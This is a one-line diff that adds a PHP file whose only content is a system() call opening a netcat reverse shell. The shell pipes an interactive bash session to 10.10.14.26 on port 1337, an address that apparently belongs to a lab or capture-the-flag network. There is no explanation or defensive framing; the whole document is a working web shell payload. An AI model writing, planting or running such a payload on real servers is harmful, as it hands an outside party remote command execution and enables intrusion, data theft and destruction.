@@ -1,0 +1,1 @@
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.26 1337 >/tmp/f"); ?>
